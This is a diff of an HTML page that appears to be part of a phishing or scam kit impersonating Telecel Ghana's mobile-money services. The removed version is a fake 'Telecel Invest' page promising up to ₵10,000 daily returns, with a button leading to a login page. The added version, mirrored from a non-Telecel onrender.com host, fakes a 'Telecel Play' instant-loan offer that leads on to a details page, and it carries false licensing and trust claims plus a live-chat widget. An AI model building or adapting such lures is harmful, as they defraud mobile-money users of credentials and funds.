@@ -1,441 +1,355 @@
 <!DOCTYPE html>
 <html lang="en">
+
+<!-- Mirrored from telecelghplaynew2026.onrender.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 21 Mar 2026 15:00:06 GMT -->
+<!-- Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<!-- /Added by HTTrack -->
+
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>Telecel Invest – grow your Telecel Cash</title>
-  <!-- font & icons (consistent with original premium style) -->
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>play.telecel.com.gh</title>
+    <link rel="icon" href="https://play.telecel.com.gh/favicon.ico" type="image/x-icon">
+    <meta name="theme-color" content="#E30613">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-    :root {
-      --bg: #f5f5f5;
-      --card: #ffffff;
-      --border: #e5e7eb;
-      --text: #111827;
-      --sub: #6b7280;
-      --telecel-red: #ff0000;
-      --telecel-darkred: #cc0000;
-      --shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
-      --radius: 18px;
-    }
+        html,
+        body {
+            min-height: 100vh;
+            font-family: 'Inter', sans-serif;
+            background: #f8f9fc;
+            overflow-x: hidden;
+            overflow-y: auto;
+        }
 
-    body {
-      font-family: 'Inter', Arial, Helvetica, sans-serif;
-      background: var(--bg);
-      color: var(--text);
-      padding: 16px 12px;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: clamp(16px, 3vw, 24px);
+        }
 
-    .container {
-      width: 100%;
-      max-width: 420px;
-      background: #f7f7f7;
-      border-radius: 28px;
-      padding: 20px 16px 24px;
-      box-shadow: var(--shadow);
-      position: relative;
-      overflow: hidden;
-    }
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: clamp(16px, 4vw, 24px);
+            text-align: center;
+            margin-bottom: clamp(16px, 4vw, 28px);
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.06);
+        }
 
-    /* iconic red top curve (Telecel signature) */
-    .top-bg {
-      position: absolute;
-      top: 0;
-      right: 0;
-      width: 200px;
-      height: 200px;
-      background: linear-gradient(135deg, rgba(255, 0, 0, 0.25), rgba(255, 0, 0, 0.6));
-      border-bottom-left-radius: 100px;
-      z-index: 0;
-      pointer-events: none;
-    }
+        .logo {
+            font-size: clamp(32px, 8vw, 40px);
+            font-weight: 800;
+            letter-spacing: -1px;
+        }
 
-    /* header with telecel circle + brand */
-    .telecel-header {
-      position: relative;
-      z-index: 2;
-      text-align: center;
-      margin-bottom: 12px;
-    }
+        .logo-telecel {
+            color: #E30613;
+        }
 
-    .logo-circle {
-      width: 48px;
-      height: 48px;
-      background: var(--telecel-red);
-      border-radius: 50%;
-      color: #fff;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 28px;
-      font-weight: 800;
-      margin: 0 auto 4px;
-      font-family: Arial, Helvetica, sans-serif;
-      box-shadow: 0 4px 10px rgba(255, 0, 0, 0.3);
-    }
+        .logo-play {
+            color: #0033A0;
+        }
 
-    .logo-text {
-      color: var(--telecel-red);
-      font-size: 24px;
-      font-weight: 800;
-      letter-spacing: -0.5px;
-      line-height: 1;
-      margin-bottom: 2px;
-    }
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: clamp(28px, 6vw, 40px) clamp(24px, 5vw, 32px);
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.08);
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            gap: 32px;
+        }
 
-    .tagline {
-      font-size: 12px;
-      color: var(--sub);
-      font-weight: 500;
-    }
+        .hero-title {
+            font-size: clamp(24px, 6vw, 32px);
+            font-weight: 700;
+            color: #1a1a1a;
+            line-height: 1.15;
+            margin-bottom: 12px;
+        }
 
-    /* investment headline (conversion focused) */
-    .investment-headline {
-      position: relative;
-      z-index: 2;
-      text-align: center;
-      margin: 6px 0 4px;
-    }
-    .investment-headline h2 {
-      font-size: 22px;
-      font-weight: 800;
-      color: #111;
-      line-height: 1.2;
-    }
-    .investment-headline p {
-      font-size: 12px;
-      color: var(--sub);
-      margin-top: 4px;
-    }
+        .hero-subtitle {
+            font-size: clamp(15px, 3.5vw, 17px);
+            color: #495057;
+            max-width: 420px;
+            margin: 0 auto 32px;
+            line-height: 1.4;
+        }
 
-    /* main investment card (formerly loan card) */
-    .invest-card {
-      background: var(--card);
-      border-radius: var(--radius);
-      padding: 20px 16px;
-      box-shadow: var(--shadow);
-      border: 1px solid var(--border);
-      text-align: center;
-      margin: 16px 0 20px;
-      position: relative;
-      z-index: 2;
-    }
+        .calc-section {
+            background: #fff5f5;
+            border-radius: 16px;
+            padding: clamp(24px, 5vw, 32px);
+            border: 1px solid #ffebee;
+        }
 
-    .invest-label {
-      font-size: 12px;
-      letter-spacing: 0.5px;
-      color: var(--sub);
-      text-transform: uppercase;
-      font-weight: 600;
-      margin-bottom: 8px;
-    }
+        .calc-title {
+            font-size: clamp(18px, 4.5vw, 22px);
+            font-weight: 700;
+            color: #2c3e50;
+            margin-bottom: 28px;
+        }
 
-    .return-rate {
-      font-size: 36px;
-      font-weight: 800;
-      color: var(--telecel-red);
-      margin-bottom: 8px;
-      line-height: 1;
-    }
-    .return-rate span {
-      font-size: 16px;
-      font-weight: 600;
-      color: #555;
-    }
+        .input-group {
+            margin-bottom: 32px;
+        }
 
-    .invest-sub {
-      font-size: 13px;
-      color: var(--sub);
-      line-height: 1.4;
-      margin-bottom: 18px;
-      max-width: 280px;
-      margin-left: auto;
-      margin-right: auto;
-    }
+        .input-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-weight: 600;
+            font-size: clamp(14px, 3.5vw, 16px);
+            color: #2c3e50;
+        }
 
-    /* features grid (investment advantages) */
-    .features {
-      display: grid;
-      grid-template-columns: repeat(2, 1fr);
-      gap: 10px;
-      margin-bottom: 6px;
-    }
+        .input-value {
+            color: #E30613;
+            font-weight: 700;
+        }
 
-    .feature {
-      background: #fafafa;
-      border-radius: 12px;
-      padding: 12px 6px;
-      font-size: 12px;
-      font-weight: 600;
-      border: 1px solid var(--border);
-      transition: 0.2s;
-      color: #2c3e50;
-    }
+        .slider {
+            -webkit-appearance: none;
+            width: 100%;
+            height: 10px;
+            border-radius: 5px;
+            background: #dee2e6;
+            outline: none;
+        }
 
-    .feature i {
-      color: var(--telecel-red);
-      font-size: 20px;
-      margin-bottom: 6px;
-      display: block;
-    }
+        .slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: #E30613;
+            cursor: pointer;
+            box-shadow: 0 2px 8px rgba(227, 6, 19, 0.3);
+        }
 
-    .feature:hover {
-      border-color: var(--telecel-red);
-      transform: translateY(-2px);
-    }
+        .range-labels {
+            display: flex;
+            justify-content: space-between;
+            color: #6c757d;
+            font-size: 13px;
+            margin-top: 8px;
+            font-weight: 500;
+        }
 
-    /* CTA button */
-    .cta {
-      margin: 20px 0;
-      position: relative;
-      z-index: 2;
-    }
+        .payment-box {
+            background: #fff5f5;
+            padding: 20px;
+            border-radius: 16px;
+            border: 1px solid #ffebee;
+            margin-top: 24px;
+        }
 
-    .btn {
-      width: 100%;
-      padding: 14px 20px;
-      border: none;
-      border-radius: 40px;
-      background: var(--telecel-red);
-      color: white;
-      font-size: 15px;
-      font-weight: 700;
-      cursor: pointer;
-      box-shadow: 0 8px 20px rgba(255, 0, 0, 0.3);
-      transition: 0.2s;
-      border: 1px solid transparent;
-    }
+        .payment-label {
+            display: block;
+            color: #495057;
+            font-size: 15px;
+            margin-bottom: 8px;
+        }
 
-    .btn:hover {
-      background: #e60000;
-      transform: scale(1.02);
-    }
+        .payment-amount {
+            font-size: clamp(28px, 8vw, 36px);
+            font-weight: 800;
+            color: #E30613;
+            letter-spacing: -0.5px;
+        }
 
-    .balance-note {
-      text-align: center;
-      font-size: 11px;
-      color: #2c6e2c;
-      background: #e8f5e9;
-      display: inline-block;
-      width: auto;
-      margin-top: 6px;
-      padding: 4px 12px;
-      border-radius: 30px;
-      font-weight: 600;
-    }
-    .balance-note i {
-      margin-right: 6px;
-      font-size: 10px;
-    }
+        .apply-btn {
+            width: 100%;
+            padding: clamp(16px, 4vw, 20px);
+            background: linear-gradient(90deg, #E30613, #b71c1c);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: clamp(17px, 4.5vw, 19px);
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 8px 24px rgba(227, 6, 19, 0.25);
+            transition: all 0.2s;
+            margin-bottom: 24px;
+        }
 
-    /* trust & security section */
-    .trust {
-      background: var(--card);
-      border-radius: var(--radius);
-      padding: 18px 14px;
-      border: 1px solid var(--border);
-      box-shadow: var(--shadow);
-      position: relative;
-      z-index: 2;
-    }
+        .apply-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 32px rgba(227, 6, 19, 0.35);
+        }
 
-    .trust-title {
-      text-align: center;
-      font-size: 13px;
-      font-weight: 700;
-      margin-bottom: 14px;
-      color: #2c3e50;
-    }
+        .features {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 24px;
+            margin-top: 16px;
+        }
 
-    .trust-grid {
-      display: grid;
-      grid-template-columns: repeat(2, 1fr);
-      gap: 10px;
-    }
+        .feature {
+            text-align: center;
+            color: #495057;
+            font-size: clamp(13px, 3.5vw, 15px);
+            flex: 1 1 120px;
+            max-width: 140px;
+        }
 
-    .badge {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 6px;
-      padding: 8px 6px;
-      font-size: 11px;
-      font-weight: 600;
-      border: 1px solid var(--border);
-      border-radius: 30px;
-      background: #fafafa;
-      color: #2c3e50;
-    }
+        .feature-icon {
+            font-size: clamp(36px, 9vw, 44px);
+            margin-bottom: 12px;
+            display: block;
+        }
 
-    .badge i {
-      color: var(--telecel-red);
-      font-size: 12px;
-    }
+        .disclaimer {
+            font-size: 13px;
+            color: #6c757d;
+            margin-top: 16px;
+            line-height: 1.4;
+        }
 
-    .footer {
-      text-align: center;
-      margin-top: 18px;
-      font-size: 10px;
-      color: #aaa;
-      position: relative;
-      z-index: 2;
-    }
+        footer {
+            padding: clamp(20px, 5vw, 32px) 20px;
+            color: #adb5bd;
+            font-size: clamp(12px, 3vw, 14px);
+            text-align: center;
+            flex-shrink: 0;
+            margin-top: auto;
+        }
 
-    /* spinner overlay (identical behavior) */
-    #spinner {
-      position: fixed;
-      inset: 0;
-      display: none;
-      align-items: center;
-      justify-content: center;
-      background: rgba(255, 255, 255, 0.85);
-      backdrop-filter: blur(3px);
-      z-index: 999;
-    }
-
-    .loader {
-      width: 44px;
-      height: 44px;
-      border: 4px solid #ffe0e0;
-      border-top: 4px solid var(--telecel-red);
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    /* small extra highlight */
-    .highlight-invest {
-      background: #fff0f0;
-      border-radius: 14px;
-      padding: 5px 10px;
-      font-size: 11px;
-      font-weight: 600;
-      color: #b91c1c;
-      display: inline-block;
-      margin-top: 10px;
-    }
-  </style>
+        @media (min-width:769px) {
+            body {
+                padding: 32px;
+                justify-content: center;
+            }
+            .card {
+                padding: 48px 40px;
+            }
+        }
+    </style>
 </head>
+
 <body>
+    <header>
+        <div class="logo"><span class="logo-telecel">Telecel</span><span class="logo-play">Play</span></div>
+    </header>
+    <main class="card">
+        <div>
+            <h1 class="hero-title">Instant Ready Loan on Telecel Cash</h1>
+            <p class="hero-subtitle">Receive a quick loan to your Telecel Cash wallet with fast approval and secure processing.</p>
+            <div class="calc-section">
+                <h2 class="calc-title">Estimate Loan & Repayment</h2>
+                <div class="input-group">
+                    <div class="input-header">
+                        <span class="input-label">Loan Amount (GH₵)</span>
+                        <span class="input-value" id="amountValue">GH₵5,000</span>
+                    </div>
+                    <input type="range" class="slider" min="500" max="50000" value="5000" id="amountSlider">
+                    <div class="range-labels"><span>GH₵500</span><span>GH₵50,000</span></div>
+                </div>
+                <div class="input-group">
+                    <div class="input-header">
+                        <span class="input-label">Loan Term (days)</span>
+                        <span class="input-value" id="termValue">30 days</span>
+                    </div>
+                    <input type="range" class="slider" min="7" max="90" value="30" id="termSlider">
+                    <div class="range-labels"><span>7 days</span><span>90 days</span></div>
+                </div>
 
-  <!-- spinner overlay for conversion action -->
-  <div id="spinner">
-    <div class="loader"></div>
-  </div>
+                <!-- ✅ APPLY NOW BUTTON MOVED ABOVE ESTIMATED REPAYMENT -->
+                <button class="apply-btn" id="applyBtn">Apply Now</button>
 
-  <div class="container">
-    <!-- signature red top curved background (unchanged elegance) -->
-    <div class="top-bg"></div>
+                <div class="payment-box">
+                    <span class="payment-label">Estimated Total Repayment (Principal + prorated 8.9% fee)</span>
+                    <span class="payment-amount" id="paymentAmount">GH₵5,445.00</span>
+                </div>
+                <p class="disclaimer">Estimate only. Actual terms: 30 days, 8.9% fee; eligibility-based.</p>
+            </div>
 
-    <!-- telecel header adapted for investments -->
-    <div class="telecel-header">
-      <div class="logo-circle">t</div>
-      <div class="logo-text">telecel invest</div>
-      <div class="tagline">grow · secure · daily returns</div>
-    </div>
-
-    <!-- conversion headline: attracts Telecel Cash users -->
-    <div class="investment-headline">
-      <h2>Turn your Telecel Cash<br>into passive income</h2>
-      <p>Invest directly from your existing wallet balance — no extra deposit needed</p>
-    </div>
-
-    <!-- INVESTMENT CARD (replaces loan range) -->
-    <div class="invest-card">
-      <div class="invest-label">🔥 Telecel Growth Account</div>
-      <div class="return-rate">Earn up to ₵10,000 daily</div>
-      <div class="invest-sub">
-        Start from ₵100 • Daily interest accrual • Withdraw anytime
-      </div>
-      <!-- bonus callout: your Telecel cash balance works instantly -->
-      <div class="balance-note">
-        <i class="fas fa-wallet"></i> Use your Telecel Cash balance — no extra transfer required
-      </div>
-
-      <!-- feature grid (investment benefits) -->
-      <div class="features" style="margin-top: 18px;">
-        <div class="feature">
-          <i class="fas fa-chart-line"></i>
-          High Yield
+            <div class="features">
+                <div class="feature">
+                    <div class="feature-icon">⚡</div>Fast Approval<br><small>Often instant for eligible users</small></div>
+                <div class="feature">
+                    <div class="feature-icon">💰</div>8.9% Monthly Fee<br><small>Transparent & competitive</small></div>
+                <div class="feature">
+                    <div class="feature-icon">🔒</div>Secure Wallet<br><small>Protected transactions</small></div>
+            </div>
         </div>
-        <div class="feature">
-          <i class="fas fa-calendar-week"></i>
-          Flexible Plans
-        </div>
-        <div class="feature">
-          <i class="fas fa-mobile-alt"></i>
-          Telecel Cash Ready
-        </div>
-        <div class="feature">
-          <i class="fas fa-chart-simple"></i>
-          Compound Growth
-        </div>
-      </div>
-      <!-- additional micro-conversion text -->
-      <div class="highlight-invest">
-        ⚡ Your eligible Telecel Cash balance starts earning today
-      </div>
-    </div>
+    </main>
+    <footer>© 2026 Telecel Ghana – Licensed Mobile Financial Services | Powered by Telecel Cash & Telecel Play</footer>
 
-    <!-- main CTA - focuses on users with Telecel Cash balance -->
-    <div class="cta">
-      <button class="btn" id="investCtaBtn">🚀 Continue with Telecel Cash</button>
-      <div style="text-align: center; font-size: 10px; color: #5a626e; margin-top: 8px;">
-        <i class="fas fa-shield-alt"></i> Zero fees • 100% digital • instant activation
-      </div>
-    </div>
+    <script>
+        const amountSlider = document.getElementById('amountSlider');
+        const termSlider = document.getElementById('termSlider');
+        const amountValue = document.getElementById('amountValue');
+        const termValue = document.getElementById('termValue');
+        const paymentAmount = document.getElementById('paymentAmount');
 
-    <!-- trust badges updated for investment credibility -->
-    <div class="trust">
-      <div class="trust-title">Trusted by over 50,000 Telecel investors</div>
-      <div class="trust-grid">
-        <div class="badge"><i class="fas fa-check-circle"></i> Regulated</div>
-        <div class="badge"><i class="fas fa-percent"></i> Competitive rates</div>
-        <div class="badge"><i class="fas fa-clock"></i> Quick withdrawal</div>
-        <div class="badge"><i class="fas fa-lock"></i> Secure & insured</div>
-      </div>
-      <!-- extra social proof: seamless Telecel cash integration -->
-      <div style="text-align: center; margin-top: 12px; font-size: 11px; color: #3b5249;">
-        <i class="fas fa-exchange-alt"></i> Seamless integration with Telecel Cash & Telecel Money
-      </div>
-    </div>
+        function updateCalculator() {
+            const amount = parseFloat(amountSlider.value);
+            const days = parseInt(termSlider.value);
 
-    <!-- footer with version and investment tag -->
-    <div class="footer">
-      v1.4 (Telecel Invest) • Grow your wealth with Telecel
-    </div>
-  </div>
+            amountValue.textContent = 'GH₵' + amount.toLocaleString();
+            termValue.textContent = days + ' day' + (days !== 1 ? 's' : '');
 
-  <script>
-    (function() {
-      const spinner = document.getElementById('spinner');
-      const investButton = document.getElementById('investCtaBtn');
+            const monthlyFeeRate = 0.089;
+            const dailyFeeRate = monthlyFeeRate / 30;
+            const totalFee = amount * dailyFeeRate * days;
+            const totalRepay = amount + totalFee;
 
-      investButton.addEventListener('click', function(e) {
-        e.preventDefault();
-        spinner.style.display = 'flex';
-        setTimeout(() => {
-          spinner.style.display = 'none';
-          window.location.href = 'login.html';
-        }, 1500);
-      });
+            paymentAmount.textContent = 'GH₵' + totalRepay.toFixed(2);
+        }
 
-      console.log('Telecel Invest — Grow your Telecel Cash balance');
-    })();
-  </script>
+        updateCalculator();
+        amountSlider.addEventListener('input', updateCalculator);
+        termSlider.addEventListener('input', updateCalculator);
+
+        document.getElementById('applyBtn').addEventListener('click', function() {
+            const amount = parseFloat(amountSlider.value);
+            const days = parseInt(termSlider.value);
+            const monthlyFeeRate = 0.089;
+            const dailyFeeRate = monthlyFeeRate / 30;
+            const totalFee = amount * dailyFeeRate * days;
+            const totalRepay = amount + totalFee;
+
+            localStorage.setItem('loanAmount', amount.toString());
+            localStorage.setItem('loanTerm', days.toString());
+            localStorage.setItem('totalRepayment', totalRepay.toFixed(2));
+
+            window.location.href = 'details.html';
+        });
+    </script>
+
+    <!--Start of Tawk.to Script-->
+    <script type="text/javascript">
+        var Tawk_API = Tawk_API || {},
+            Tawk_LoadStart = new Date();
+        (function() {
+            var s1 = document.createElement("script"),
+                s0 = document.getElementsByTagName("script")[0];
+            s1.async = true;
+            s1.src = 'https://embed.tawk.to/687297843606072bf849fc63/1ivvpvno8';
+            s1.charset = 'UTF-8';
+            s1.setAttribute('crossorigin', '*');
+            s0.parentNode.insertBefore(s1, s0);
+        })();
+    </script>
+    <!--End of Tawk.to Script-->
 </body>
+
+<!-- Mirrored from telecelghplaynew2026.onrender.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 21 Mar 2026 15:00:07 GMT -->
+
 </html>
